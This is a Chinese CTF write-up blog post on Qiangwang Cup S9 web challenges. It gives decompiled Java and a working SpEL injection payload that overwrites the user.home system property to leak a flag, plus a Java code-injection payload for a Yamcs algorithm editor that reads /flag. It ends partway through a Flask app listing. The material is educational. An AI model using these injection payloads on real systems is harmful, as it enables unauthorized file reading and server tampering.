<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>强网杯S9-web | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="bbjv先反编译一下 GatewayController.class 1234567891011121314151617181920212223242526272829303132333435363738@RestControllerpublic class GatewayController &#123;    private final EvaluationService evaluation">
<meta property="og:type" content="article">
<meta property="og:title" content="强网杯S9-web">
<meta property="og:url" content="https://sakuraraindrop.github.io/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/index.html">
<meta property="og:site_name" content="cheng_xing&#39;s blog">
<meta property="og:description" content="bbjv先反编译一下 GatewayController.class 1234567891011121314151617181920212223242526272829303132333435363738@RestControllerpublic class GatewayController &#123;    private final EvaluationService evaluation">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
<meta property="article:published_time" content="2025-11-04T06:24:51.000Z">
<meta property="article:modified_time" content="2025-11-10T17:26:45.809Z">
<meta property="article:author" content="cheng_xing">
<meta property="article:tag" content="include">
<meta property="article:tag" content="spel">
<meta property="article:tag" content="celery">
<meta property="article:tag" content="php匿名类">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "强网杯S9-web",
  "url": "https://sakuraraindrop.github.io/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/",
  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
  "datePublished": "2025-11-04T06:24:51.000Z",
  "dateModified": "2025-11-10T17:26:45.809Z",
  "author": [
    {
      "@type": "Person",
      "name": "cheng_xing",
      "url": "https://sakuraraindrop.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '强网杯S9-web',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">78</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">163</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">强网杯S9-web</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">强网杯S9-web</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-04T06:24:51.000Z" title="发表于 2025-11-04 14:24:51">2025-11-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-10T17:26:45.809Z" title="更新于 2025-11-11 01:26:45">2025-11-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/2025%E7%BA%BF%E4%B8%8A%E8%B5%9B/">2025线上赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="bbjv"><a href="#bbjv" class="headerlink" title="bbjv"></a>bbjv</h2><p>先反编译一下</p>
<p>GatewayController.class</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GatewayController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> EvaluationService evaluationService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GatewayController</span><span class="params">(EvaluationService evaluationService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.evaluationService = evaluationService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/check&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">checkRule</span><span class="params">(<span class="meta">@RequestParam</span> String rule)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.evaluationService.evaluate(rule);</span><br><span class="line">        <span class="type">File</span> <span class="variable">flagFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;user.home&quot;</span>), <span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flagFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(flagFile));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">                    result = result + <span class="string">&quot;&lt;br&gt;&lt;b&gt;\ud83d\udea9 Flag:&lt;/b&gt; &quot;</span> + content;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var8) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        br.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">                        var8.addSuppressed(var7);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">throw</span> var8;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                br.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var9) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var9);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在&#x2F;check路由中，会在user.home代表的目录下查找flag.txt，如果存在则读出来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">flagFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;user.home&quot;</span>), <span class="string">&quot;flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>Dockerfile里可以看到flag的位置是&#x2F;tmp&#x2F;flag.txt，因此我们需要让user.home的值为&#x2F;tmp</p>
<p>另外可以发现&#x2F;check路由中我们可以传入一个rule参数，作为参数传入到evaluationService类的evaluate方法中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvaluationService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> EvaluationContext context;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvaluationService</span><span class="params">(EvaluationContext context)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.context = context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">evaluate</span><span class="params">(String expression)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.parser.parseExpression(expression, <span class="keyword">new</span> <span class="title class_">TemplateParserContext</span>()).getValue(<span class="built_in">this</span>.context);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Result: &quot;</span> + String.valueOf(result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error: &quot;</span> + var3.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到rule会被当作SpEL模板来执行，另外查阅下相关资料就知道使用parseExpression解析时传入的模板必须是 <code>#&#123;&#125;</code> 的格式</p>
<p>另外补充一些背景知识</p>
<blockquote>
<p>在 SpEL 中，表达式解析和求值的流程可以分为三个关键部分：</p>
<ul>
<li>ExpressionParser：负责将字符串表达式解析为 Expression 对象，类似于“编译器”将代码转为可执行单元。</li>
<li>EvaluationContext：提供表达式求值时的上下文环境，包含变量、属性解析器、类型转换器等，类似于“运行时环境”。</li>
<li>Expression：表示解析后的表达式对象，负责在特定上下文中计算结果，类似于“可执行的函数”。</li>
</ul>
</blockquote>
<p>但是在SpelConfig类中对表达式求值时的上下文环境EvaluationContext做了限制</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpelConfig</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SpelConfig</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean(&#123;&quot;systemProperties&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">systemProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> System.getProperties();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean(&#123;&quot;restrictedEvalContext&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> EvaluationContext <span class="title function_">restrictedEvaluationContext</span><span class="params">(<span class="meta">@Qualifier(&quot;systemProperties&quot;)</span> Properties systemProperties)</span> &#123;</span><br><span class="line">        <span class="type">SimpleEvaluationContext</span> <span class="variable">simpleContext</span> <span class="operator">=</span> SimpleEvaluationContext.forPropertyAccessors(<span class="keyword">new</span> <span class="title class_">PropertyAccessor</span>[]&#123;<span class="keyword">new</span> <span class="title class_">SecurePropertyAccessor</span>()&#125;).build();</span><br><span class="line">        simpleContext.setVariable(<span class="string">&quot;systemProperties&quot;</span>, systemProperties);</span><br><span class="line">        <span class="keyword">return</span> simpleContext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SimpleEvaluationContext就是Spring官方专门搞出来的一个受限版SpEL环境，T(java.lang.XXX)这种类型引用，new 构造器表达式，任意方法调用，Bean解析，反射这些全部不允许。</p>
<p>另外结合SecurePropertyAccessor类，可以发现重写了canRead方法始终返回false，禁止了所有属性访问操作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurePropertyAccessor</span> <span class="keyword">extends</span> <span class="title class_">ReflectivePropertyAccessor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SecurePropertyAccessor</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canRead</span><span class="params">(EvaluationContext context, Object target, String name)</span> <span class="keyword">throws</span> AccessException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是题目给我们留了一个系统属性systemProperties，由于SimpleEvaluationContext仍然允许对Map键值对的索引读写，因此我们可以用Map下标写入的形式去修改系统属性，即便SecurePropertyAccessor把属性访问禁了，它也拦不住我们去改Map里的东西，而user.home又正好是一个系统属性。</p>
<p>因此payload如下，#的作用是引用systemProperties,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;#systemProperties[&#x27;user.home&#x27;]=&#x27;/tmp&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>url编码一下发送即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check?rule=%23%7B%23systemProperties%5B%27user.home%27%5D%3D%27%2Ftmp%27%7D</span><br></pre></td></tr></table></figure>

<h2 id="yamcs"><a href="#yamcs" class="headerlink" title="yamcs"></a>yamcs</h2><p>可以当作一个纯黑盒题来打，其实只要找到哪些能执行代码，哪里能看到代码执行的结果就可以了。</p>
<p>最终发现&#x2F;algorithms&#x2F;myproject&#x2F;copySunsensor&#x2F;-&#x2F;summary?c&#x3D;myproject__realtime里面可以执行代码</p>
<p>默认是执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out0.setFloatValue(in.getEngValue().getFloatValue());</span><br></pre></td></tr></table></figure>

<p>修改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out0.setFloatValue(1);</span><br></pre></td></tr></table></figure>

<p>可以在trace里的Runs看到输出<br><img src="/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/1.png" alt="alt text"></p>
<p>那么就知道我们能看到out0的值，后面让AI搓下代码把flag的值用out0带出来即可</p>
<p>一个示例payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">out0.setStringValue(</span><br><span class="line">    (String) java.util.concurrent.ForkJoinPool.commonPool().submit(</span><br><span class="line">        new java.util.concurrent.Callable() &#123;</span><br><span class="line">            public Object call() throws Exception &#123;</span><br><span class="line">                return new String(</span><br><span class="line">                    java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(&quot;/flag&quot;)),</span><br><span class="line">                    java.nio.charset.StandardCharsets.UTF_8</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ).join()</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="SecretVault"><a href="#SecretVault" class="headerlink" title="SecretVault"></a>SecretVault</h2><p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    flash,</span><br><span class="line">    g,</span><br><span class="line">    jsonify,</span><br><span class="line">    make_response,</span><br><span class="line">    redirect,</span><br><span class="line">    render_template,</span><br><span class="line">    request,</span><br><span class="line">    url_for,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.exc <span class="keyword">import</span> IntegrityError</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">db = SQLAlchemy()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">80</span>), unique=<span class="literal">True</span>, nullable=<span class="literal">False</span>)</span><br><span class="line">    password_hash = db.Column(db.String(<span class="number">128</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">    salt = db.Column(db.String(<span class="number">64</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">    created_at = 